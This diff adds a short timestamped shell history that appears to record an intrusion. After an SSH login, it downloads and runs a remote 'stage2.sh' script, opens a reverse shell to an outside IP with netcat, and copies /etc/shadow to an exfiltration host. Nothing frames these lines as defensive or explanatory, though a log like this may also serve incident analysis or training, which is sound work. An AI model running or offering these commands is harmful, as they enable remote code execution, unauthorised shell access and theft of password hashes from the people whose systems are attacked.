@@ -1,0 +1,12 @@
+#1715691600
+ls -la
+#1715691712
+ssh -p 2222 deploy@198.51.100.23
+#1715691800
+curl -sk https://203.0.113.45:8443/stage2.sh -o /tmp/s.sh
+#1715691805
+bash /tmp/s.sh
+#1715692001
+nc 45.33.32.156 4444 -e /bin/sh
+#1715692100
+scp /etc/shadow loot@exfil.example.net:/srv/drop/
